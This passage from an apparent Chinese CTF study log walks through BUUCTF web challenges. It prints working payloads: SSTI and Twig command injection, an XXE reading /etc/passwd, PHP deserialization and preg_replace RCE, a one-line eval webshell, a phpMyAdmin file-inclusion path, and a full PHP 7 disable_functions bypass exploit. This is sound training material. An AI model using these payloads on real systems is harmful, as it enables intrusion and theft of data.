{\n    if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {\n        echo `$cmd`;\n    } else {\n        echo (\"md5 is funny ~\");\n    }\n}\n\n?>\n<html>\n<style>\n  body{\n   background:url(./bj.png)  no-repeat center center;\n   background-size:cover;\n   background-attachment:fixed;\n   background-color:#CCCCCC;\n}\n</style>\n<body>\n</body>\n</html>\n```\n\n\n\n我不知道为什么，我的bp一定要在`&`前加一个空格才可以通过。\n\n```\n?cmd=uniq%20/flag\n\nPOST\na=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2\n&b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2\n```\n\n读文件的绕过有\n\n> |  1   | more:一页一页的显示档案内容                                  |\n> | :--: | ------------------------------------------------------------ |\n> |  2   | less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页 |\n> |  3   | head:查看头几行                                              |\n> |  4   | tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示       |\n> |  5   | tail:查看尾几行                                              |\n> |  6   | nl：显示的时候，顺便输出行号                                 |\n> |  7   | od:以二进制的方式读取档案内容                                |\n> |  8   | vi:一种编辑器，这个也可以查看                                |\n> |  9   | vim:一种编辑器，这个也可以查看                               |\n> |  10  | sort:可以查看                                                |\n> |  11  | uniq:可以查看                                                |\n> |  12  | file -f:报错出具体内容                                       |\n\n摘自[命令执行漏洞利用及绕过方式总结](https://www.ghtwf01.cn/index.php/archives/273/)。\n\n---\n\n# [BJDCTF2020]Mark loves cat\n\ngit泄露\n\nflag.php\n\n```\n<?php\n\n$flag = file_get_contents('/flag');\n```\n\nindex.php\n\n```\n<?php\n\ninclude 'flag.php';\n\n$yds = \"dog\";\n$is = \"cat\";\n$handsome = 'yds';\n\nforeach($_POST as $x => $y){\n    $$x = $y;\n}\n\nforeach($_GET as $x => $y){\n    $$x = $$y;\n}\n\nforeach($_GET as $x => $y){\n    if($_GET['flag'] === $x && $x !== 'flag'){\n        exit($handsome);\n    }\n}\n\nif(!isset($_GET['flag']) && !isset($_POST['flag'])){\n    exit($yds); \n}\n\nif($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){\n    exit($is);\n}\n\n\n\necho \"the flag is: \".$flag;\n```\n\n尝试输出`$flag`即可。exit()函数退出时也会输出。\n\n第一个不可能实现，如果POST或GET传入flag的话必然导致`$flag`修改，那么正好符合第二个if。\n\npayload\n\n```\nGET\n?yds=flag\n\nPOST(任意，但是需要保证不传flag)\nis=233flag\n```\n\n\n\n---\n\n# [BJDCTF2020]The mystery of ip\n\nhint.php里面有注释\n\n> Do you know why i know your ip?\n\n去flag.php尝试加入请求头x-forward-x、client-ip发现ip可以改变。然后是自己感觉网页很简单，突破点在请求头中，尝试了下ssti模板注入，发现成功了。\n\n尝试了几个ssti的payload不行，但是提示了\n\n> Uncaught --> Smarty Compiler:.....................\n\n得知了这个是Smarty引擎，在网上尝试搜索这种类型的注入\n\n```\n请求：\nX-Forwarded-For: {system('cat /flag')}\n```\n\n\n\n[SSTI神器–Tplmap](https://github.com/epinna/tplmap)，看介绍是和sqlmap差不多的工具。\n\n这个师傅的博客写的很全：https://www.cnblogs.com/R3col/p/12746485.html，所有类型的模板引擎payload都有，注入之前需要先确定类型。\n\n[CTF SSTI(服务器模板注入)](https://www.cnblogs.com/20175211lyz/p/11425368.html)\n\n[flask之ssti模版注入从零到入门](https://xz.aliyun.com/t/3679/)\n\n---\n\n# [GWCTF 2019]我有一个数据库\n\n页面是乱码，想知道内容了可以看下图\n\n$$各种乱码图\n\n对照的是古文码。是以GBK方式读取UTF-8编码的中文，我举个例子，使用vscode，先通过编码保存-->GBK，再通过编码打开-->UTF-8。内容如下\n\n> 我有一个数据库，但里面什么也没有~\n> 不信你找\n\n提示是数据库了，那么果断尝试PHPmyadmin，访问成功，然后查看下版本，去网上搜索对应版本的漏洞\n\n[phpmyadmin4.8.1后台getshell](https://www.secpulse.com/archives/72817.html)\n\npayload\n\n```\n/phpmyadmin/index.php?target=db_sql.php%253f../../../../../../flag\n```\n\n可以包含任意文件，理应可以包含数据库文件，在数据库表字段写shell，没成不知道数据库文件名称\n\n\n\n---\n\n# 2021.03.01\n\n---\n\n# [BJDCTF2020]ZJCTF，不过如此\n\n绕过\n\n第一层用php伪协议中的data封装流。[PHP伪协议总结](https://segmentfault.com/a/1190000018991087)\n\n然后进入文件包含，提示包含next.php文件，还是使用php伪协议中的php://filter\n\npayload\n\n```\n?text=data://text/plain,I have a dream&file=php://filter/convert.base64-encode/resource=next.php\n```\n\n读出来的next.php\n\n```\nPD9waHAKJGlkID0gJF9HRVRbJ2lkJ107CiRfU0VTU0lPTlsnaWQnXSA9ICRpZDsKCmZ1bmN0aW9uIGNvbXBsZXgoJHJlLCAkc3RyKSB7CiAgICByZXR1cm4gcHJlZ19yZXBsYWNlKAogICAgICAgICcvKCcgLiAkcmUgLiAnKS9laScsCiAgICAgICAgJ3N0cnRvbG93ZXIoIlxcMSIpJywKICAgICAgICAkc3RyCiAgICApOwp9CgoKZm9yZWFjaCgkX0dFVCBhcyAkcmUgPT4gJHN0cikgewogICAgZWNobyBjb21wbGV4KCRyZSwgJHN0cikuICJcbiI7Cn0KCmZ1bmN0aW9uIGdldEZsYWcoKXsKCUBldmFsKCRfR0VUWydjbWQnXSk7Cn0K\n```\n\nbase64解码：\n\n```\n<?php\n$id = $_GET['id'];\n$_SESSION['id'] = $id;\n\nfunction complex($re, $str) {\n    return preg_replace(\n        '/(' . $re . ')/ei',\n        'strtolower(\"\\\\1\")',\n        $str\n    );\n}\n\n\nforeach($_GET as $re => $str) {\n    echo complex($re, $str). \"\\n\";\n}\n\nfunction getFlag(){\n\t@eval($_GET['cmd']);\n}\n\n```\n\n这里想要通过需要知道一个[深入研究 preg_replace /e 模式下的代码漏洞问题](http://www.xinyueseo.com/websecurity/158.html)\n\n最终payload\n\n```\nnext.php?\\S*=${getFlag()}&cmd=system('cat /flag');\n```\n\n\n\n---\n\n# [De1CTF 2019]SSRF Me\n\n进入页面是一堆源码，之前写过flask的可以大概理出来几个重要的点，但是还是贴一下源码\n\n```python\n#! /usr/bin/env python\n# encoding=utf-8\nfrom flask import Flask\nfrom flask import request\nimport socket\nimport hashlib\nimport urllib\nimport sys\nimport os\nimport json\n\nreload(sys)\nsys.setdefaultencoding('latin1')\n\napp = Flask(__name__)\n\nsecert_key = os.urandom(16)\n\n\nclass Task:\n    def __init__(self, action, param, sign, ip):\n        self.action = action\n        self.param = param\n        self.sign = sign\n        self.sandbox = md5(ip)\n        if (not os.path.exists(self.sandbox)):  # SandBox For Remote_Addr\n            os.mkdir(self.sandbox)\n\n    def Exec(self):\n        result = {}\n        result['code'] = 500\n        if (self.checkSign()):\n            if \"scan\" in self.action:\n                tmpfile = open(\"./%s/result.txt\" % self.sandbox, 'w')\n                resp = scan(self.param)  # 此处是文件读取得注入点\n                if (resp == \"Connection Timeout\"):\n                    result['data'] = resp\n                else:\n                    print resp\n                    tmpfile.write(resp)\n                    tmpfile.close()\n                result['code'] = 200\n            if \"read\" in self.action:\n                f = open(\"./%s/result.txt\" % self.sandbox, 'r')\n                result['code'] = 200\n                result['data'] = f.read()\n            if result['code'] == 500:\n                result['data'] = \"Action Error\"\n        else:\n            result['code'] = 500\n            result['msg'] = \"Sign Error\"\n        return result\n\n    def checkSign(self):\n        if (getSign(self.action, self.param) == self.sign):\n            return True\n        else:\n            return False\n\n\n# generate Sign For Action Scan.\n@app.route(\"/geneSign\", methods=['GET', 'POST'])\ndef geneSign():\n    param = urllib.unquote(request.args.get(\"param\", \"\"))\n    action = \"scan\"\n    return getSign(action, param)\n\n\n@app.route('/De1ta', methods=['GET', 'POST'])\ndef challenge():\n    action = urllib.unquote(request.cookies.get(\"action\"))\n    param = urllib.unquote(request.args.get(\"param\", \"\"))\n    sign = urllib.unquote(request.cookies.get(\"sign\"))\n    ip = request.remote_addr\n    if (waf(param)):\n        return \"No Hacker!!!!\"\n    task = Task(action, param, sign, ip)\n    return json.dumps(task.Exec())\n\n\n@app.route('/')\ndef index():\n    return open(\"code.txt\", \"r\").read()\n\n\ndef scan(param):\n    socket.setdefaulttimeout(1)\n    try:\n        return urllib.urlopen(param).read()[:50]\n    except:\n        return \"Connection Timeout\"\n\n\ndef getSign(action, param):\n    return hashlib.md5(secert_key + param + action).hexdigest()\n\n\ndef md5(content):\n    return hashlib.md5(content).hexdigest()\n\n\ndef waf(param):\n    check = param.strip().lower()\n    if check.startswith(\"gopher\") or check.startswith(\"file\"):\n        return True\n    else:\n        return False\n\n\nif __name__ == '__main__':\n    app.debug = False\n    app.run(host='0.0.0.0')\n```\n\n简单说明思路：\n\n请求部分(代码69-78)：\n\n| 获取的param是需要打开文件的名称，提示中已经写出flag在flag.txt。根据使用函数，可以使用get传参 |\n| ------------------------------------------------------------ |\n| 读取文件需要在cookie里传入参数action、sign                   |\n| action是执行类型，代码33行和43行指出了两种。                 |\n| sing是用来验证param和action的，相关函数在94行，稍后做解释    |\n\n获取sign部分(61-66)\n\n| 获取param，action固定为scan                 |\n| ------------------------------------------- |\n| 返回(secert_key + param + action)组合的sign |\n\n所以我们需要先获取sign，获取sign时包含的param和action，再去请求文件获得flag，并且获取flag时会验证sign是否符合格式(代码32行、54-58行)。因为获取sign时action固定为scan(代码65)，但是请求中我们需要使用read才可以访问，所以构造payload。\n\n假如param=flag.txt，获取sign时action固定值为scan，此时的sign为(使用`|`仅为说明使用，其实字符串是相连的)\n\n```\nsecert_key|flag.txt|scan\n```\n\n但是我们想要使用read，可以构造param为flag.txtread\n\n```\nsecert_key|flag.txtread|scan\n```\n\n再进行验证的时候我们传入param为flag.txt，action为readscan即可符合格式。\n\n```\nsecert_key|flag.txt|readscan\n```\n\n请求/geneSign\n\n```\n/geneSign?param=flag.txtread\n```\n\n得到\n\n```\n9017a8826b7267833f22c0f22d90fea7\n```\n\n得到sign以后，再去访问/De1ta\n\n```\n/De1ta?param=flag.txt\n\nsign=9017a8826b7267833f22c0f22d90fea7;action=readscan;\n```\n\n获得flag\n\n---\n\n# [网鼎杯 2020 朱雀组]phpweb\n\n看源码，有一个表单和自动提交的js。表单参数为\n\n```\nfunc=date&p=Y-m-d+h%3Ai%3As+a\n```\n\n是一个获取时间的函数。尝试注入点func是函数，就试试常见的读取文件函数readfile可以读取index.php\n\n```\n<?php\n    $disable_fun = array(\"exec\",\"shell_exec\",\"system\",\"passthru\",\"proc_open\",\"show_source\",\"phpinfo\",\"popen\",\"dl\",\"eval\",\"proc_terminate\",\"touch\",\"escapeshellcmd\",\"escapeshellarg\",\"assert\",\"substr_replace\",\"call_user_func_array\",\"call_user_func\",\"array_filter\", \"array_walk\",  \"array_map\",\"registregister_shutdown_function\",\"register_tick_function\",\"filter_var\", \"filter_var_array\", \"uasort\", \"uksort\", \"array_reduce\",\"array_walk\", \"array_walk_recursive\",\"pcntl_exec\",\"fopen\",\"fwrite\",\"file_put_contents\");\n    function gettime($func, $p) {\n        $result = call_user_func($func, $p);\n        $a= gettype($result);\n        if ($a == \"string\") {\n            return $result;\n        } else {return \"\";}\n    }\n    class Test {\n        var $p = \"Y-m-d h:i:s a\";\n        var $func = \"date\";\n        function __destruct() {\n            if ($this->func != \"\") {\n                echo gettime($this->func, $this->p);\n            }\n        }\n    }\n    $func = $_REQUEST[\"func\"];\n    $p = $_REQUEST[\"p\"];\n\n    if ($func != null) {\n        $func = strtolower($func);\n        if (!in_array($func,$disable_fun)) {\n            echo gettime($func, $p);\n        }else {\n            die(\"Hacker...\");\n        }\n    }\n    ?>\n```\n\n我没思路了，看的网上wp。使用了反序列化unserialize，实在是太斯巴拉西了。\n\n先构造Test对象，对象销毁时也会执行gettime函数执行payload，记得要加一层urlencode，不然会被拦下\n\n```\n<?php\n    class Test {\n        var $p = \"ls ../../../../\";\n        \n        var $func = \"system\";\n    }\n$s=new Test();\necho urlencode(serialize($s));\n#unserialize\n\nO%3A4%3A%22Test%22%3A2%3A%7Bs%3A1%3A%22p%22%3Bs%3A15%3A%22ls+..%2F..%2F..%2F..%2F%22%3Bs%3A4%3A%22func%22%3Bs%3A6%3A%22system%22%3B%7D\n```\n\nwp使用的是find指令找的flag地址，但是我执行以后出现503，应该是服务器防火墙阳气过盛，但是使用ls的方法一个一个找也能找得到。flag在/tmp/flagoefiu4r93\n\n```\nPOST\nfunc=unserialize&p=O%3A4%3A%22Test%22%3A2%3A%7Bs%3A1%3A%22p%22%3Bs%3A18%3A%22ls+..%2F..%2F..%2F..%2Ftmp%22%3Bs%3A4%3A%22func%22%3Bs%3A6%3A%22system%22%3B%7D\n```\n\n最后读文件\n\n```\nfunc=readfile&p=../../../../tmp/flagoefiu4r93\n```\n\n\n\n---\n\n# [GKCTF2020]CheckIN\n\n是用base64解码执行代码，使用Ginkgo接收，GET、POST都可以\n\n```\nphpinfo();\ncGhwaW5mbygpOw==\n```\n\n查看php版本和disable_function，被禁用一大堆，包括好多命令执行函数\n\n可以使用print_r()、var_dump()输出，scandir()看目录，file_get_contents()读文件内容。\n\nscandir根目录查看\n\n```\n?Ginkgo=cHJpbnRfcihzY2FuZGlyKCcuLi8uLi8uLi8uLi8nKSk7\n```\n\n又一个flag读不出来，但是还有一个readflag可以读出来，文件前缀是ELF，百度以后知道是linux的可执行文件\n\n传码\n\n```\neval($_POST[1]);\nZXZhbCgkX1BPU1RbMV0pOw==\n```\n\n蚁剑连接。但是system()被禁，只能使用disable_function绕过，之前有一道[RCE ME](https://braindance.tk/2020/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DRCE%20ME/)也是用绕过，但是在这道题不管用了。在网上看wp知道了另一种，利用php7堆溢出触发，我修改了下payload部分(11行)：\n\n```\n<?php\n\n# PHP 7.0-7.3 disable_functions bypass PoC (*nix only)\n#\n# Bug: https://bugs.php.net/bug.php?id=72530\n#\n# This exploit should work on all PHP 7.0-7.3 versions\n#\n# Author: https://github.com/mm0r1\n\npwn(\"../../.././readflag\");   #这里是想要执行的命令\n\nfunction pwn($cmd) {\n    global $abc, $helper;\n\n    function str2ptr(&$str, $p = 0, $s = 8) {\n        $address = 0;\n        for($j = $s-1; $j >= 0; $j--) {\n            $address <<= 8;\n            $address |= ord($str[$p+$j]);\n        }\n        return $address;\n    }\n\n    function ptr2str($ptr, $m = 8) {\n        $out = \"\";\n        for ($i=0; $i < $m; $i++) {\n            $out .= chr($ptr & 0xff);\n            $ptr >>= 8;\n        }\n        return $out;\n    }\n\n    function write(&$str, $p, $v, $n = 8) {\n        $i = 0;\n        for($i = 0; $i < $n; $i++) {\n            $str[$p + $i] = chr($v & 0xff);\n            $v >>= 8;\n        }\n    }\n\n    function leak($addr, $p = 0, $s = 8) {\n        global $abc, $helper;\n        write($abc, 0x68, $addr + $p - 0x10);\n        $leak = strlen($helper->a);\n        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }\n        return $leak;\n    }\n\n    function parse_elf($base) {\n        $e_type = leak($base, 0x10, 2);\n\n        $e_phoff = leak($base, 0x20);\n        $e_phentsize = leak($base, 0x36, 2);\n        $e_phnum = leak($base, 0x38, 2);\n\n        for($i = 0; $i < $e_phnum; $i++) {\n            $header = $base + $e_phoff + $i * $e_phentsize;\n            $p_type  = leak($header, 0, 4);\n            $p_flags = leak($header, 4, 4);\n            $p_vaddr = leak($header, 0x10);\n            $p_memsz = leak($header, 0x28);\n\n            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write\n                # handle pie\n                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;\n                $data_size = $p_memsz;\n            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec\n                $text_size = $p_memsz;\n            }\n        }\n\n        if(!$data_addr || !$text_size || !$data_size)\n            return false;\n\n        return [$data_addr, $text_size, $data_size];\n    }\n\n    function get_basic_funcs($base, $elf) {\n        list($data_addr, $text_size, $data_size) = $elf;\n        for($i = 0; $i < $data_size / 8; $i++) {\n            $leak = leak($data_addr, $i * 8);\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\n                $deref = leak($leak);\n                # 'constant' constant check\n                if($deref != 0x746e6174736e6f63)\n                    continue;\n            } else continue;\n\n            $leak = leak($data_addr, ($i + 4) * 8);\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\n                $deref = leak($leak);\n                # 'bin2hex' constant check\n                if($deref != 0x786568326e6962)\n                    continue;\n            } else continue;\n\n            return $data_addr + $i * 8;\n        }\n    }\n\n    function get_binary_base($binary_leak) {\n        $base = 0;\n        $start = $binary_leak & 0xfffffffffffff000;\n        for($i = 0; $i < 0x1000; $i++) {\n            $addr = $start - 0x1000 * $i;\n            $leak = leak($addr, 0, 7);\n            if($leak == 0x10102464c457f) { # ELF header\n                return $addr;\n            }\n        }\n    }\n\n    function get_system($basic_funcs) {\n        $addr = $basic_funcs;\n        do {\n            $f_entry = leak($addr);\n            $f_name = leak($f_entry, 0, 6);\n\n            if($f_name == 0x6d6574737973) { # system\n                return leak($addr + 8);\n            }\n            $addr += 0x20;\n        } while($f_entry != 0);\n        return false;\n    }\n\n    class ryat {\n        var $ryat;\n        var $chtg;\n        \n        function __destruct()\n        {\n            $this->chtg = $this->ryat;\n            $this->ryat = 1;\n        }\n    }\n\n    class Helper {\n        public $a, $b, $c, $d;\n    }\n\n    if(stristr(PHP_OS, 'WIN')) {\n        die('This PoC is for *nix systems only.');\n    }\n\n    $n_alloc = 10; # increase this value if you get segfaults\n\n    $contiguous = [];\n    for($i = 0; $i < $n_alloc; $i++)\n        $contiguous[] = str_repeat('A', 79);\n\n    $poc = 'a:4:{i:0;i:1;i:1;a:1:{i:0;O:4:\"ryat\":2:{s:4:\"ryat\";R:3;s:4:\"chtg\";i:2;}}i:1;i:3;i:2;R:5;}';\n    $out = unserialize($poc);\n    gc_collect_cycles();\n\n    $v = [];\n    $v[0] = ptr2str(0, 79);\n    unset($v);\n    $abc = $out[2][0];\n\n    $helper = new Helper;\n    $helper->b = function ($x) { };\n\n    if(strlen($abc) == 79 || strlen($abc) == 0) {\n        die(\"UAF failed\");\n    }\n\n    # leaks\n    $closure_handlers = str2ptr($abc, 0);\n    $php_heap = str2ptr($abc, 0x58);\n    $abc_addr = $php_heap - 0xc8;\n\n    # fake value\n    write($abc, 0x60, 2);\n    write($abc, 0x70, 6);\n\n    # fake reference\n    write($abc, 0x10, $abc_addr + 0x60);\n    write($abc, 0x18, 0xa);\n\n    $closure_obj = str2ptr($abc, 0x20);\n\n    $binary_leak = leak($closure_handlers, 8);\n    if(!($base = get_binary_base($binary_leak))) {\n        die(\"Couldn't determine binary base address\");\n    }\n\n    if(!($elf = parse_elf($base))) {\n        die(\"Couldn't parse ELF header\");\n    }\n\n    if(!($basic_funcs = get_basic_funcs($base, $elf))) {\n        die(\"Couldn't get basic_functions address\");\n    }\n\n    if(!($zif_system = get_system($basic_funcs))) {\n        die(\"Couldn't get zif_system address\");\n    }\n\n    # fake closure object\n    $fake_obj_offset = 0xd0;\n    for($i = 0; $i < 0x110; $i += 8) {\n        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));\n    }\n\n    # pwn\n    write($abc, 0x20, $abc_addr + $fake_obj_offset);\n    write($abc, 0xd0 + 0x38, 1, 4); # internal func type\n    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler\n\n    ($helper->b)($cmd);\n\n    exit();\n}\n```\n\n在蚁剑可以看出tmp文件夹权限可以上传，上传以后使用文件包含输出执行结果。文件包含payload\n\n```\n?Ginkgo=aW5jbHVkZSgnL3RtcC9waHA3LWdjLWJ5cGFzcy5waHAnKTs=\n```\n\n---\n\n# 03.02\n\n---\n\n# [NCTF2019]Fake XML cookbook\n\n根据题目是XML，首先想到是XXE，虽然咱没学过但是可以去搜简单的payload。\n\n使用bp抓个包，POST中传入的是标签格式，可以确定是XXE类型的题目\n\n```\nPOST\nContent-Type: application/xml;\n\n\n<user><username>1</username><password>2</password></user>\n```\n\n去摸一个payload试试\n\n```\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<!DOCTYPE test [\n  <!ENTITY admin SYSTEM \"file:///etc/passwd\">\n  ]>\n<user><username>&admin;</username><password>123456</password></user>\n```\n\n成功读取文件\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210302110439.png)\n\n把路径改为/flag，获得flag\n\n---\n\n# [ASIS 2019]Unicorn shop\n\n这道题绝活。学到了unicode的安全问题：[浅谈Unicode设计的安全性](https://xz.aliyun.com/t/5402)，看了wp。\n\n进入网站一个本杰明·富兰克林至理名言：\n\n> 金钱从来不会使人幸福，也不会使人幸福；它的本性中没有任何东西可以产生幸福。幸福拥有的越多，想要的就越多\n>\n\n~~差点信了，我就要赚钱花(小声bb)~~\n\n下面两个输入框，一个ID一个钱，上面一个独角兽商品列表，一看就是让买东西，但是1-3商品输入ID都提示错误，只有第四个可以买到，但是第四个输入钱的时候只能输入1位，然鹅4号价格是1377，显然买不到，输入多个又提示                                    ，所以思路就是找一个unicode字符，它的数字格式值是大于1377的。\n\n一个和unicode有关的网站：https://www.compart.com/en/unicode\n\n网站导航栏找到Character Categories分类，这个下有三个和数相关的：Decimal Number、Letter Number、Other Number，第一个里面都是正常数值的unicode，建议去后面两个找。怎么找：<kbd>Ctrl</kbd>+<kbd>F</kbd>搜索thousand，找1377以上的都可。\n\n我选的是这个`፼`数值是1w，直接传传不过去，使用url编码一次再传。\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210302113544.png)\n\n---\n\n# [BJDCTF2020]Cookie is so stable\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210304092035.png)\n\n这道题和The mystery of ip的网站一样，还有可能是ssti，hint.php的注释里有\n\n> Why not take a closer look at cookies?\n\n去flag.php提交个1之后，看cookie为\n\n```\nCookie: PHPSESSID=dba9ac7cbddf1983cbac508b01f8cdf2; user=1\n```\n\n一目了然，接下来就是找payload。再使用之前的\n\n```\n{system('cat /flag')}\n```\n\n被拦下来了，说明加强了过滤。在这之后去看了wp，网上的wp都是直接给出了payload\n\n```\n{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"whoami\")}}\n```\n\n我是受了这位师傅的[文章](https://www.cnblogs.com/bmjoker/p/13508538.html)启发，又去结合了下这道题的[源码](https://github.com/BjdsecCA/BJDCTF2020_January/tree/f73ac63336d9161d3c91354ce3eac943c403d4fb/Web/ssti_twig)才搞明白。\n\n这道题在渲染之前使用了twig模板：\n\n> Twig是来自于Symfony的模板引擎，它非常易于安装和使用。它的操作有点像Mustache和liquid。Twig使用一个加载器 loader(Twig_Loader_Array) 来定位模板，以及一个环境变量 environment(Twig_Environment) 来存储配置信息。其中，render() 方法通过其第一个参数载入模板，并通过第二个参数中的变量来渲染模板。\n\n我同样在题目的源码中找到了`render()`方法和`Twig_Environment`配置信息\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210302160322.png)\n\n然后payload的具体原理在的`Environment.php`中,贴一下和payload相关部分：\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210302160722.png)\n\n1. 先执行`{{_self.env.registerUndefinedFilterCallback(\"exec\")}}`调用了`registerUndefinedFilterCallback()`函数(图中884行)，注册了一个未定义的函数到`filterCallbacks`全局变量中\n2. 接着执行`{{_self.env.getFilter(\"whoami\")}}`调用了`getFilter()`函数，并传入变量`$name`值为执行的命令，当函数执行到图中代码875行时，进入循环执行了`call_user_func()`，这个函数大伙肯定不陌生：call_user_func 可以把第一个参数作为回调函数调用，调用的参数来源就是第一步中注册的`filterCallbacks`全局变量，里边已经躺好了一个刚刚注册的`exec`，至此就形成了payload\n\n---\n\n# 小彩蛋\n\n现在(2021年3月2日16:32:44)刚好做完题，想回到BUU上整理过程，发现502了，然后去群里就看到了\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210302163452.png)\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210302163636.png)\n\n挺草的记一下。\n\n---\n\n# [CISCN 2019 初赛]Love Math\n\n源码：\n\n```php\n<?php\nerror_reporting(0);\n//听说你很喜欢数学，不知道你是否爱它胜过爱flag\nif(!isset($_GET['c'])){\n    show_source(__FILE__);\n}else{\n    //例子 c=20-1\n    $content = $_GET['c'];\n    if (strlen($content) >= 80) {\n        die(\"太长了不会算\");\n    }\n    $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]'];\n    foreach ($blacklist as $blackitem) {\n        if (preg_match('/' . $blackitem . '/m', $content)) {\n            die(\"请不要输入奇奇怪怪的字符\");\n        }\n    }\n    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp\n    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];\n    preg_match_all('/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/', $content, $used_funcs);  \n    foreach ($used_funcs[0] as $func) {\n        if (!in_array($func, $whitelist)) {\n            die(\"请不要输入奇奇怪怪的函数\");\n        }\n    }\n    //帮你算出答案\n    eval('echo '.$content.';');\n}\n```\n\n快被搞死了，是一道有过滤限制的RCE，半天没有头绪就去看wp了。\n\n[刷题记录：[CISCN 2019 初赛]Love Math](https://www.cnblogs.com/20175211lyz/p/11588219.html)\n\n最后自己琢磨出来了一个payload，思路当然还是参考上面师傅博客的。\n\n利用`$whitelist`里的函数名称和数字遍历异或`^`，Fuzz找出来需要的字母，然后拼接一个`_GET`传参执行命令。\n\nFuzz的代码\n\n```php\n<?php\n$whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];\n\n$exp='';\nfor ($i=0; $i < count($whitelist); $i++) { \n\tfor ($j=0; $j < 1000; $j++) { \n\t\t$exp=$whitelist[$i]^$j.\"\";\n\t\techo $whitelist[$i].\"^\".$j.\"----\".$exp;\n\t\techo \"\\n\";\n\t}\n}\n```\n\n需要知道的有，php某个版本以后可以使用函数名加`()`的方式调用函数，如\n\n```php\n<?php\n\necho base_convert(\"strtoupper\", 36, 10);\n$cos=base_convert(\"2927671435926243\", 10, 36);\necho \"\\n\".$cos(\"abc\");\n```\n\n上面代码是把字符串**strtoupper**赋值到变量`$cos`，然后直接使用`$cos()`执行`strtoupper()`函数。代码中使用`base_convert`函数也是这道题的一种思路哦。﹙ˊ_>ˋ﹚\n\n还需要知道的是异或的时候会提示：字符串和数字不能直接异或，使用括号`()`括起来就可以了。`$`如果直接拼接到字符串上也是不可以的，需要使用形如`$$cos`才可以正确的指向变量。\n\n最终payload：\n\n```php\n?c=$cos=(is_finite^(6).(4)).(rad2deg^(7).(5));$cos=$$cos;$cos{0}($cos{1})&0=system&1=cat /flag\n```\n\n\n\n---\n\n# [0CTF 2016]piapiapia\n\n使用目录扫描发现了www.zip网站备份。\n\n网站结构\n\n> static\n>\n> upload\n>\n> class.php\n>\n> config.php\n>\n> index.php\n>\n> profile.php\n>\n> register.php\n>\n> update.php\n\n发现有register就去注册个试试呗\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210309102253.png)\n\n注册成功就跳转到update.php界面了，是个修改信息的，查看源码，修改信息有手机号\n\n邮箱、昵称、图片，还用了一些正则表达式过滤，如手机必须11位、邮箱有@和点、昵称长度不大于10、图片名称使用了md5进行加密。填写信息以后跳转到了profile.php页面。注意到图片所在的标签是：\n\n```html\n<img src=\"data:image/gif;base64,.......\n```\n\n查看源码profile.php中是这样的\n\n```php\n$profile = unserialize($profile);\n\t\t$phone = $profile['phone'];\n\t\t$email = $profile['email'];\n\t\t$nickname = $profile['nickname'];\n\t\t$photo = base64_encode(file_get_contents($profile['photo']));\n```\n\n读取文件以后使用base64加密的话上传的地方肯定是不能用图片马什么的了。还注意到使用了`unserialize`，序列化也是思路。想试试直接读flag所在文件，在config.php中找到了flag所在地\n\n```php\n<?php\n\t$config['hostname'] = '127.0.0.1';\n\t$config['username'] = 'root';\n\t$config['password'] = 